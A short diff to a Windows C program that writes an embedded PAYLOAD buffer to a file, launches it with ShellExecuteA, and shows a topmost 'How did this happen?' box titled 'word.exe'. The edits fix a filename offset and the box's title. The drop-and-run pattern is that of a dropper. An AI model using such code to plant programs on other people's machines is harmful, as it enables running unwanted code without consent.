@@ -27,7 +27,7 @@ int WinMain(void){
 	while (fp[r]!='/'&&fp[r]!='\\'){
 		r--;
 	}
-	__movsd((unsigned long*)(fp+r),(unsigned long*)f_nm,5);
+	__movsd((unsigned long*)(fp+r+1),(unsigned long*)f_nm,5);
 	HANDLE f=CreateFileA(fp,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
 	if (f==INVALID_HANDLE_VALUE){
 		return 1;
@@ -35,7 +35,7 @@ int WinMain(void){
 	WriteFile(f,PAYLOAD,PAYLOAD_SIZE,&r,NULL);
 	CloseHandle(f);
 	ShellExecuteA(NULL,"open",fp,NULL,NULL,SW_SHOW);
-	MessageBoxA(NULL,"How did this happen?","Word.exe?",MB_OK|MB_TOPMOST|MB_SYSTEMMODAL);
+	MessageBoxA(NULL,"How did this happen?","word.exe",MB_OK|MB_TOPMOST|MB_SYSTEMMODAL);
 	STARTUPINFOA si={
 		sizeof(STARTUPINFOA)
 	};
